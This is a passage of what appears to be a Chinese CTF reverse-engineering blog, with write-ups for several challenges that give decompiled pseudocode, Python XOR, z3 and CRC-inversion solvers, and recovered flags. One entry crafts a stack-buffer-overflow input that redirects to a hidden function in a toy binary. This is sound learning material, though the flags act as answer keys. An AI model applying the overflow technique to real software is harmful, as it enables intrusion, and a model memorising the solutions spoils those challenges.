[3,37,72,9,6,132]flag1 = []k = 0for i in range(13): for j in string.printable: if ord(j) ^ en[(i%6)] == output[k]: flag1.append(j) for j in string.printable: if ord(j) ^ en[(i%6)] == output[k+1]: flag1.append(j) k += 2flag1 = &quot;&quot;.join(flag1)print(flag1)# fc2a8bb7f347a6f8a05c5c69f3 最后只需要解z3就可以了： 1234567891011121314151617from z3 import *s = Solver()a1,a2,a3,a4,a5,a6 = Ints(&quot;a1 a2 a3 a4 a5 a6&quot;)s.add(a1*3+a2*2+a3*5 == 1003)s.add(a1*4 + a2*7 + a3*9 == 2013)s.add(a1 + a2*8 +a3*2 == 1109)s.add(a4*3+a5*2+a6*5 == 671)s.add(a4*4+a5*7+a6*9 == 1252)s.add(a4 + a5*8 + a6*2 == 644)s.check()print(s.model())flag2 = &quot;&quot;result = [97,101,102,102,55,51]for i in result: flag2 += chr(i)# aeff73 最后把flag拼一下： GWHT{fc2a8bb7f347a6f8a05c5c69f3aeff73} [ACTF新生赛2020]fungame (溢出) ida32打开看看 123456789101112int __cdecl main(int argc, const char **argv, const char **envp){ void *v4; // [esp+1Ch] [ebp-4h] __main(); v4 = malloc(0x14u); memset(v4, 0, 0x14u); memset(x, 0, 0x18u); sub_401340(v4); sub_4013BA(v4); return 0;} sub_401340函数，动调y1的值即可（后来发现y1的数组直接告诉我们了,shift+e提取即可） shift+e提取数据 123456789y1 = [0x23, 0x61, 0x3e, 0x69, 0x54, 0x41, 0x18, 0x4d, 0x6e, 0x3b, 0x65, 0x53, 0x30, 0x79, 0x45, 0x5b]y2 = [0x71, 0x04, 0x61, 0x58, 0x27, 0x1E, 0x4B, 0x22, 0x5E, 0x64, 0x03, 0x26, 0x5E, 0x17, 0x3C, 0x7A]flag = &quot;&quot;print(len(y1))print(len(y2))for i in range(len(y1)): flag += chr(y1[i]^y2[i]) print(flag)#Re_1s_So0_funny! –更新– 参考 以为到这边就结束了，发现输入的flag不对，于是查看下面一个函数 12345678int __cdecl sub_4013BA(char *Source){ char Destination[12]; // [esp+1Ch] [ebp-Ch] BYREF strcpy(Destination, Source); strcpy(x, Source); return 0;} Destination的大小只有12，但是我们传过来的参数大小为16位，所以肯定会溢出，超出的4个字符，作为地址，调用隐藏函数sub_40233D，交叉引用参数x，可以找到函数sub_40233D base64解码，注意，函数sub_40233D还输出了x，即函数的地址，所以我们需要在flag中添加上 且，ida中使用的是小端序，添加地址需要注意。 1234567891011121314from Crypto.Util.number import *import base64y1 = [0x23, 0x61, 0x3e, 0x69, 0x54, 0x41, 0x18, 0x4d, 0x6e, 0x3b, 0x65, 0x53, 0x30, 0x79, 0x45, 0x5b]y2 = [0x71, 0x04, 0x61, 0x58, 0x27, 0x1E, 0x4B, 0x22, 0x5E, 0x64, 0x03, 0x26, 0x5E, 0x17, 0x3C, 0x7A]flag = &quot;&quot;for i in range(len(y2)): flag += (chr(y1[i]^y2[i]))string = b&quot;YTFzMF9wV24=&quot;decode = base64.b64decode(string)flag = &quot;flag{&quot; + flag +chr(0x3d)+chr(0x23)+chr(0x40)+ decode.decode('utf-8')+&quot;}&quot;print(flag)# flag{Re_1s_So0_funny!=#@a1s0_pWn} 给我整蒙了…… [未完FlareOn2]very_success放在linux中，file一下 die查一下： 用ida32打开 查看sub_401000函数，调整一下堆栈平衡，alt+k,调整最前面的堆栈平衡。 反汇编成功的伪代码 1234567891011121314151617BOOL __usercall sub_401000@&lt;eax&gt;(int a1@&lt;ebp&gt;){ HANDLE StdHandle; // [esp-14h] [ebp-14h] HANDLE v3; // [esp-10h] [ebp-10h] int v4[3]; // [esp-Ch] [ebp-Ch] BYREF int retaddr; // [esp+0h] [ebp+0h] v4[1] = a1; StdHandle = GetStdHandle(0xFFFFFFF6); v3 = GetStdHandle(0xFFFFFFF5); WriteFile(v3, aYouCrushedThat, 0x43u, v4, 0); ReadFile(StdHandle, Buffer, 0x32u, v4, 0); if ( sub_401084(v4, retaddr, Buffer, v4[0]) ) return WriteFile(v3, aYouAreSuccess, 17u, v4, 0); else return WriteFile(v3, aYouAreFailure, 17u, v4, 0);} 这题的逻辑看的我头晕 境界还不够，先放一放 [SCTF2019]Strange apk (apk动态释放文件)用jeb进行返汇编。 上次做apk逆向，告诉我assets目录下面存放着很重要的东西，在这边只看到了一个data文件，很奇怪。 发现了几个奇怪的函数 按x查看“_”函数的调用 函数的意思就是把这个asset目录下的data文件和字符串”syclover” 进行异或，我们用脚本来还原。 这个脚本网上很多都是还原成2000KB+的文件，和源文件对应不上，反汇编不起来。我重新找了个脚本，但是需要很长时间跑出来。 123456789101112s = &quot;syclover&quot;count = 0with open('data', 'rb') as f: while (1): data = f.read(1) if not data: break data2 = ord(data) ^ ord(s[count % len(s)]) with open('dates', 'ab') as g: c = data2.to_bytes(1, byteorder='little', signed=False) g.write(c) count += 1f.close 查看datas头文件可以发现，跑出来datas文件是apk格式的文件，后缀改成apk，然后再用jeb打开。 首先查看s文件 1string = &quot;c2N0ZntXM2xjMG1l&quot; base64解码一下 再去分析t文件 syclover在进行md5加密之后，作为key与data进行了encode 将这串字符中的“8”去掉 123string = &quot;~8t808_8A8n848r808i8d8-8w808r8l8d8}8&quot;.replace(&quot;8&quot;,&quot;&quot;)print(string)# ~t0_An4r0id-w0rld} sctf{W3lc0me~t0_An4r0id-w0rld} 还是先用正常一点的方法来看这道题： 首先是寻找app的入口点，打开Manifest文件，入口点是myappllicatin.t，但是我们只能看到sctf.hello这个包。所以可能是app动态释放文件 当我们运行上面的脚本之后，再次查看Mainfest文件，可以看到入口点和包对应上了。 较好解决方案应该是用映射大师，“frida dex dump(python)将app运行时候的dex给dump下来再进行分析。”–引用大佬的话 尝试了许久，发现不太支持，先放一放…… [RoarCTF2019]polyre (OLLVM控制流程平坦化+CRC) ida64拖进去看看 定位一下： 对于这个程序，我没有一点话要说…… –更新– 参考： https://security.tencent.com/index.php/blog/msg/112 https://blog.csdn.net/liuxiaohuai_/article/details/114369681 查阅博客后，得知该程序添加了控制流平坦化，目的是为了模糊基本块之间的前后关系，以及增大分析的难度，我们需要使用deflat.py执行控制流平坦化脚本命令，且使用其脚本需要安装angr库 输入命令： 1python3 deflat.py attachment 0x400620 关于这行命令，最重要的就是后面的地址的选取，其实是函数的起始地址 还是感谢大佬的好心提示，脚本运行需要修改一些东西，关于这边存放的是am_graph模块的存放地址 复原成功之后，下面是ida反汇编伪代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143__int64 __fastcall main(int a1, char **a2, char **a3){ signed __int64 v4; // [rsp+1E0h] [rbp-110h] int i; // [rsp+1E8h] [rbp-108h] int v6; // [rsp+1ECh] [rbp-104h] int v7; // [rsp+1ECh] [rbp-104h] char s1[48]; // [rsp+1F0h] [rbp-100h] BYREF char s[60]; // [rsp+220h] [rbp-D0h] BYREF unsigned int v10; // [rsp+25Ch] [rbp-94h] char *v11; // [rsp+260h] [rbp-90h] int v12; // [rsp+26Ch] [rbp-84h] bool v13; // [rsp+272h] [rbp-7Eh] unsigned __int8 v14; // [rsp+273h] [rbp-7Dh] int v15; // [rsp+274h] [rbp-7Ch] char *v16; // [rsp+278h] [rbp-78h] int v17; // [rsp+284h] [rbp-6Ch] int v18; // [rsp+288h] [rbp-68h] bool v19; // [rsp+28Fh] [rbp-61h] char *v20; // [rsp+290h] [rbp-60h] int v21; // [rsp+298h] [rbp-58h] bool v22; // [rsp+29Fh] [rbp-51h] __int64 v23; // [rsp+2A0h] [rbp-50h] bool v24; // [rsp+2AFh] [rbp-41h] __int64 v25; // [rsp+2B0h] [rbp-40h] __int64 v26; // [rsp+2B8h] [rbp-38h] __int64 v27; // [rsp+2C0h] [rbp-30h] __int64 v28; // [rsp+2C8h] [rbp-28h] int v29; // [rsp+2D0h] [rbp-20h] int v30; // [rsp+2D4h] [rbp-1Ch] char *v31; // [rsp+2D8h] [rbp-18h] int v32; // [rsp+2E0h] [rbp-10h] int v33; // [rsp+2E4h] [rbp-Ch] bool v34; // [rsp+2EBh] [rbp-5h] v10 = 0; memset(s, 0, 0x30uLL); memset(s1, 0, sizeof(s1)); printf(&quot;Input:&quot;); v11 = s; if ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) goto LABEL_43; while ( 1 ) { __isoc99_scanf(&quot;%s&quot;, v11); v6 = 0; if ( dword_603058 &lt; 10 || (((dword_603054 - 1) * dword_603054) &amp; 1) == 0 ) break;LABEL_43: __isoc99_scanf(&quot;%s&quot;, v11); } while ( 1 ) { do v12 = v6; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v13 = v12 &lt; 64; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) ; if ( !v13 ) break; v14 = s[v6]; do v15 = v14; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); if ( v15 == 10 ) { v16 = &amp;s[v6]; *v16 = 0; break; } v17 = v6 + 1; do v6 = v17; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); } for ( i = 0; ; ++i ) { do v18 = i; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); do v19 = v18 &lt; 6; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); if ( !v19 ) break; do v20 = s; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v4 = *&amp;v20[8 * i]; v7 = 0; while ( 1 ) { v21 = v7; do v22 = v21 &lt; 64; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); if ( !v22 ) break; v23 = v4; v24 = v4 &lt; 0; if ( v4 &gt;= 0 ) { v27 = v4; do v28 = 2 * v27; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v4 = v28; } else { v25 = 2 * v4; do v26 = v25; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v4 = v26 ^ 0xB0004B7679FA26B3LL; } v29 = v7; do v7 = v29 + 1; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); } v30 = 8 * i; v31 = &amp;s1[8 * i]; if ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 )LABEL_55: *v31 = v4; *v31 = v4; if ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) goto LABEL_55; v32 = i + 1; } do v33 = memcmp(s1, &amp;unk_402170, 0x30uLL); while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v34 = v33 != 0; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) ; if ( v34 ) puts(&quot;Wrong!&quot;); else puts(&quot;Correct!&quot;); return v10;} 从大佬那边荡过来的简化代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152_int64 __fastcall main(__int64 a1, char **a2, char **a3){ signed __int64 v4; signed int j,i,k; char s1[48],s[60]; unsigned __int8 v14; char *v16; int v33; memset(s, 0, 0x30uLL); memset(s1, 0, 0x30uLL); printf(&quot;Input:&quot;, 0LL); scanf_s(&quot;%s&quot;, s); for (i = 0; ; ++i) { if (i &gt;= 64) break; v14 = s[i]; if (v14 == '\\n') { v16 = &amp;s[i]; *v16 = 0; break; //换行符换成 '/0 ' } } for (j = 0; j &lt; 6; ++j) { v4 = *&amp;s[8 * j]; // 输入的每8个字节一组，组成1个64位的v4，小端序 for (k = 0; k &lt; 64 ; ++k) // 循环64次 { if (v4 &gt;= 0) // 如果v4非负，v4*=2，相当于左移一位，结果必为偶数，如果左移一位后最高位为1，则v4变成了负数 v4 *= 2LL; else // 如果v4为负，v4乘2后再异或0xB0004B7679FA26B3，相当于先左移一位再异或，结果必为奇数，注意这时最高位的1被移出了 v4 = 2 * v4 ^ 0xB0004B7679FA26B3LL; } } v33 = memcmp(s, &amp;unk_402170, 0x30uLL); /*（冗余码）unk_402170=[ 0x96, 0x62, 0x53, 0x43, 0x6D, 0xF2, 0x8F, 0xBC, 0x16, 0xEE, 0x30, 0x05, 0x78, 0x00, 0x01, 0x52, 0xEC, 0x08, 0x5F, 0x93, 0xEA, 0xB5, 0xC0, 0x4D, 0x50, 0xF4, 0x53, 0xD8, 0xAF, 0x90, 0x2B, 0x34, 0x81, 0x36, 0x2C, 0xAA, 0xBC, 0x0E, 0x25, 0x8B, 0xE4, 0x8A, 0xC6, 0xA2, 0x81, 0x9F, 0x75, 0x55] */ if (v33 != 0) puts(&quot;Wrong!&quot;); else puts(&quot;Correct!&quot;); return 0;} 具体的逻辑： 123456789v12 = 0if(v12&lt;0x40): v4 = v28 if(v4 &gt;= 0): v28 = v28 * 2 else: v28 = v28 * 2 v28 = v28 ^ 0xB0004B7679FA26B3 v12 += 1 从别处得知是CRC32加密 大致流程：输入 48位，分成 6 组，将每组 8 字节转化为 long 类型的值，对每组进行加密，先判断正负，然后将值乘 2，随后根据正负异或 0xB0004B7679FA26B3，循环 64 次，最后与unk_402170进行比较。 需要注意的是ida的小端序，代码来源 123456789101112131415161718192021222324252627origin = [0xbc8ff26d43536296, 0x520100780530ee16, 0x4dc0b5ea935f08ec, 0x342b90afd853f450, 0x8b250ebcaa2c3681, 0x55759f81a2c68ae4]key = 0xB0004B7679FA26B3data = &quot;&quot;for value in origin: for i in range(0, 64): # 判断奇偶 parity = value &amp; 1 if parity == 1: value = (value ^ key) &gt;&gt; 1 value = value | 0x8000000000000000 else: value = value &gt;&gt; 1 print(hex(value)) j = 0 while (j &lt; 8): # 因为是小端序，需要从最后一个字节开始取 data += chr(value &amp; 0xFF) # 右移 8 位，倒着取字节 value = value &gt;&gt; 8 j += 1print(data) 可以对照看一下CRC64加密算法的C实现 https://blog.csdn.net/l1028386804/article/details/50748724 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475/* * Improved calculation of CRC-64 values for protein sequences * By Adam Lu 刘亚壮 - 2016-02-26 */ #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include &lt;string.h&gt; /* If you want to try the old CRC-64 function, currently employed in SWISSPROT/TrEMBL then uncomment the next line *//* #define OLDCRC */ #ifdef OLDCRC #define POLY64REV 0xd800000000000000ULL #define INITIALCRC 0x0000000000000000ULL#else #define POLY64REV 0x95AC9329AC4BC9B5ULL #define INITIALCRC 0xFFFFFFFFFFFFFFFFULL#endif void crc64(char *seq, char *res){ int i, j, low, high; unsigned long long crc = INITIALCRC, part; static int init = 0; static unsigned long long CRCTable[256]; if (!init) { init = 1; for (i = 0; i &lt; 256; i++) { part = i; for (j = 0; j &lt; 8; j++) { if (part &amp; 1) part = (part &gt;&gt; 1) ^ POLY64REV; else part &gt;&gt;= 1; } CRCTable[i] = part; } } while (*seq) crc = CRCTable[(crc ^ *seq++) &amp; 0xff] ^ (crc &gt;&gt; 8); /* The output is done in two parts to avoid problems with architecture-dependent word order */ low = crc &amp; 0xffffffff; high = (crc &gt;&gt; 32) &amp; 0xffffffff; sprintf (res, &quot;%08X%08X&quot;, high, low); return;} void main (int argc, char *argv[]){ char *testseq1 = &quot;MNIIQGNLVGTGLKIGIVVGRFNDFITSKLLSGAEDALLRHGVDTNDIDVAWVPGAFEIPFAAKKMAETKKYDAIITLGTVIRGATTSYDYVCNEAAKGIAQAANTTGVPVIFGIVTTENIEQAIERAGTKAGNKGVDCAVSAIEMANLNRSFE&quot;; char *testseq2 = &quot;MNIIQGNLVGTGLKIGIVVGRFNDFITSKLLSGAEDALLRHGVDTNDIDVAWVPGAFEIPFAAKKMAETKKYDAIITLGDVIRGATTHYDYVCNEAAKGIAQAANTTGVPVIFGIVTTENIEQAIERAGTKAGNKGVDCAVSAIEMANLNRSFE&quot;; /* Differs from 1st seq in two places */ char result[20]; crc64(testseq1, result); printf(&quot;The CRC-64 for sequence %s is %s\\n&quot;, testseq1, result); crc64(testseq2, result); printf(&quot;The CRC-64 for sequence %s is %s\\n&quot;, testseq2, result);} [GKCTF 2021]QQQQT (base58)用die扫一下： 用网上下载了一个EnigmaVBUnpacker 解包之后再次扫描已经没有壳了 但是程序也打不开了…… 放到xdbg32中，发现可以字符串 1string = &quot;56fkoP8KhwCf3v7CEz&quot; flag{12t4tww3r5e77} [NPUCTF2020]你好sao啊(base64换表解密)可以看出，中间的RxEncode是一个base64换表解密 将只需要将v15,v16,v17,v18从后往前拼成字节 可以看到这个表中，数字5和6换成了{和}，只需要把最后base64加密中的5和6替换即可。 12345import base64string = b&quot;\\x9E\\x9b\\x9C\\xB5\\xFE\\x70\\xD3\\x0F\\xb2\\xd1\\x4f\\x9c\\x02\\x7f\\xab\\xde\\x59\\x65\\x63\\xe7\\x40\\x9d\\xcd\\xfa\\x04&quot;flag = base64.b64encode(string)print(flag)#'npuctf{w0w+y0U+cAn+r3lllY+dAnc3}BA==' [UTCTF2020]babymips (mips+异或运算)用ida打开，函数很清晰： shift+e提取数据unk_4015F4,并将前84个赋值给v7 跟进sub_401164函数： a2，是上面数据提取的v7，这样的话，这题静态分析也可以做，动调也可以做。 1234567arr =[98, 108, 127, 118, 122, 123, 102, 115, 118, 80, 82, 125, 64, 84, 85, 121, 64, 73, 71, 77, 116, 25, 123, 106, 66, 10, 79, 82, 125, 105, 79, 83, 12, 100, 16, 15, 30, 74, 103, 3, 124, 103, 2, 106, 49, 103, 97, 55, 122, 98, 44, 44, 15, 110, 23, 0, 22, 15, 22, 10, 109, 98, 115, 37, 57, 118, 46, 28, 99, 120, 43, 116, 50, 22, 32, 34, 68, 25, 0, 0, 0, 0, 0, 78]print(len(arr))flag = &quot;&quot;for i in range(len(arr)): flag += chr(arr[i]^(i+23))print(flag)#utflag{mips_cpp_gang_5VDm:~`N]ze;\\)5%vZ=C'C(r#$q=*efD&quot;ZNY_GX&gt;6&amp;sn.wF8$v*mvA@'}efghi$ [WUSTCTF2020]funnyre (花指令+异或运算)ida64打开，一整块的汇编都在报红，需要手动恢复main函数 mian函数调好之后发现有错误，跟进查看返汇编 经典花指令，会出现好几次，需要一个一个手修。 nop掉jz和jnz，然后对比其他汇编的硬编码就能知道错误在哪里了 修复成功之后，分析一下main函数，输入字符串为38位，除去头5位与最后一位，其他字符串，经过很多次运算之后，与unk_4025C0数组的32位进行对比 对unk_4025C0数组进行数据提取： 注意，中间还存在了一个取反运算 三百多个数据，一个一个输入，累死了=^=，幸好解出来了: 12345678910111213141516171819202122232425arr = [ 0xD9, 0x2C, 0x27, 0xD6, 0xD8, 0x2A, 0xDA, 0x2D, 0xD7, 0x2C, 0xDC, 0xE1, 0xDB, 0x2C, 0xD9, 0xDD, 0x27, 0x2D, 0x2A, 0xDC, 0xDB, 0x2C, 0xE1, 0x29, 0xDA, 0xDA, 0x2C, 0xDA, 0x2A, 0xD9, 0x29, 0x2A]add = [8,21,60,24,7,16,20,31,28,54,26,78,34,45,13,81,98,22,76,93,36,48,72,3,95,92,18,51,25,35,39,63,88,19,46,82,66,27,47,49,29,62,23,2,77,15,37,40,4,75,14,69,61,42,52,73,6,56,96,71,67,50,68,97,32,55,86,94,11,33,43,38,17,74,10,84,12,70,44,89,85,41,53,65,57,90,1,58,59,83,87,99,5,9,91,30,79,64,80]huo1 = [0x67,0x68,0xc3,0x23,0xe9,0x8,0x3b,0x50,0xfa,0x64,0xc8,0x5,0xf5,0x76,0x86,0x41,0x99,0xf0,0x37,0x49,0x4c,0x18,0x39,0x5d,0x2c,0x75,0x4d,0x95,0xed,0x84,0x10,0x32,0x2,0x12,0x9c,0x65,0x73,0x2f,0x13,0xc,0xbd,0x96,0xa8,0x33,0xd2,0xe2,0xc7,0xd3,0x4e,0xa9,0xf9]# nothuo2 = [0xef,0x62,0x66,0xce,0x14,0xb,0xb6,0x7,0xa3,0x97,0xdc,0xb8,0xe7,0xd5,0x7f,0x82,0x34,0xe1,0x98,0xe3,0xf6,0xeb,0xd8,0xda,0x1d,0x9d,0x7d,0x80,0xc9,0x27,0xa0,0x8e,0xf7,0x6f,0xfb,0x9a,0x9b,0xcb,0xd4,0x30,0xac,0x60,0x92,0xaf,0x2d,0xab,0x51,0xb7,0x35,0xd0,0xa4,0xad,0xc0,0xec,0xbe,0xfc,0xbb,0x54,0xc5,0xc1,0xc6,0x3,0xde,0x5e,0x3a,0xfd,0x29,0x31,0x85,0x2b,0xb9,0x55,0xdf,0xcf,0x4b,0xcc,0x1f,0xd6,0x93,0xf,0xe0,0xd1,0xb0,0xf1,0x56,0xf4,0x45,0x63,0x7c,0x2e,0x11,0x81,0x1c,0x77,0xfe,0x3f,0x36,0x87,0xbf,0xba,0x8b,0xa7,0x26,0x5f,0x72,0xdb,0x47,0x4a,0x15,0x19,0xb4,0x7b,0x8a,0x9,0xe8,0x71,0x20,0x88,0xe6,0x46,0x25,0xee,0xa5,0x8f,0x43,0x1a,0x5b,0xd9,0x61,0x79,0xa6,0xb3,0x8c,0x90,0x44,0x3d,0xc2,0x22,0x6b,0xa2,0x1e,0x6d,0x57,0x74,0x1,0xbc,0x94,0x2a,0x7e,0xe5,0x21,0x5c,0x69,0xb1,0x5a,0x17,0xd,0xb5,0xd7,0x16,0x89,0x40,0x6e,0xe4,0x48,0xea,0x28,0x70,0x78,0x6,0xa1,0x3c,0x9f,0xf2,0x58,0xf8,0xae,0xaa,0x1b,0x52,0xdd,0x7a,0x38,0x8d,0xe,0x42,0x9e,0x4,0x53,0xc4,0x83,0x24,0x4f,0x6c,0x3e,0xca,0xf3,0xa,0x59,0x6a,0xcd,0x91]for i in range(len(add)): for j in range(32): arr[j] -= add[i]for i in range(len(huo1)): for j in range(32): arr[j] ^= huo1[i]for i in range(32): arr[i] = ~arr[i]for i in range(len(huo2)): for j in range(32): arr[j] ^= huo2[i]flag = &quot;&quot;for i in arr: flag += chr(i%128)print(&quot;flag{&quot;+flag+&quot;}&quot;)#flag{1dc20f6e3d497d15cef47d9a66d6f1af} [QCTF2018]Xman-babymips (mips+位移运算)用ida32打开，虽然是mips架构的程序，但是生成的伪代码还是很清晰的： 12345678910111213141516int __fastcall main(int a1, char **a2, char **a3){ int i; // [sp+18h] [+18h] BYREF char v5[36]; // [sp+1Ch] [+1Ch] BYREF setbuf((FILE *)stdout, 0); setbuf((FILE *)stdin, 0); printf(&quot;Give me your flag:&quot;); scanf(&quot;%32s&quot;, v5); for ( i = 0; i &lt; 32; ++i ) v5[i] ^= 32 - (_BYTE)i; if ( !strncmp(v5, fdata, 5u) ) return sub_4007F0(v5); else return puts(&quot;Wrong&quot;);} 跟进sub_4007F0函数 123456789101112131415161718int __fastcall sub_4007F0(const char *a1){ char v1; // $v1 size_t i; // [sp+18h] [+18h] for ( i = 5; i &lt; strlen(a1); ++i ) { if ( (i &amp; 1) != 0 ) v1 = (a1[i] &gt;&gt; 2) | (a1[i] &lt;&lt; 6); else v1 = (4 * a1[i]) | (a1[i] &gt;&gt; 6); a1[i] = v1; } if ( !strncmp(a1 + 5, (const char *)off_410D04, 0x1Bu) ) return puts(&quot;Right!&quot;); else return puts(&quot;Wrong!&quot;);} 先进行一个异或，然后五位后面的进行一个移位或运算 最后对比，shift+e提取数据 12345678910111213string1 = [81,124,106,123,103]string2 =[ 0x52, 0xFD, 0x16, 0xA4, 0x89, 0xBD, 0x92, 0x80, 0x13, 0x41, 0x54, 0xA0, 0x8D, 0x45, 0x18, 0x81, 0xDE, 0xFC, 0x95, 0xF0, 0x16, 0x79, 0x1A, 0x15, 0x5B, 0x75, 0x1F]for i in range(len(string2)): if i%2 == 0: string2[i] = ((string2[i] &lt;&lt; 2) % 0x100 | string2[i] &gt;&gt; 6) else: string2[i] = ( string2[i] &gt;&gt; 2 | (string2[i] &lt;&lt; 6) % 0x100) string1.append(string2[i])flag = &quot;&quot;for i in range(len(string1)): flag += chr((32-i) ^ string1[i])print(flag) 其中，因为要考虑到溢出情况，所以%0x100，当然ascii码的范围在128以内，所以求余0x80也可以。 [羊城杯 2020]login (pyinstaller解包+pyc返汇编+z3) Pyinstaller如何解包 现在就是需要根据struct.pyc文件头来修复login.pyc的文件头 大佬使用010editor，那我也使用010editor struct.pyc: login.pyc： 对比一下，我们复制struct.pyc的E3之前的数据复制到login就可以成功修复文件了 uncompyle6不支持反汇编python 3.9版本的pyc文件 我使用的是pycdc，使用方法在这里 1./pycdc /home/ks/桌面/pyinstaller/login.pyc 就能看到py代码了 1234567891011121314151617181920212223from z3 import *a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14=Ints(&quot;a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14&quot;)s=Solver()s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748)s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190)s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * 128 - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)print(s.check())print(s.model()) 123456789101112131415sat[a13 = 88, a3 = 10, a4 = 7, a10 = 108, a12 = 74, a1 = 119, a7 = 28, a6 = 43, a9 = 52, a14 = 33, a5 = 104, a8 = 91, a2 = 24, a11 = 88] 1234567891011arr = [ 10,24,119,7,104,43,28,91,108,52,88,74,88,33]for i in range(12,-1,-1): arr[i] = arr[i]^arr[i+1]flag = &quot;&quot;for i in arr: flag += chr(i)print(flag)#U_G07_th3_k3y!#flag{58964088b637e50d3a22b9510c1d1ef8} [MRCTF2020]PixelShooter（apk逆向/C#逆向）这次又换了一个安卓逆向工具：jeb 听大佬说安卓Unity游戏核心逻辑一般位于assets\\bin\\Data\\Managed\\Assembly-CSharp.dll中 进入之后，搜索字符串就出来了 如果说是unity逆向，那么dnspy可以逆向出来啊，大佬能逆出来，为啥我逆不出来？？ 参考链接： [FlareOn5]Ultimate Minesweeper (.NET逆向)dotnet题，用dnSpy64打开 动调了许久，找不出门路，于是借鉴了大佬Hk_Mayfly的文章 首先是找到判断的主要函数处 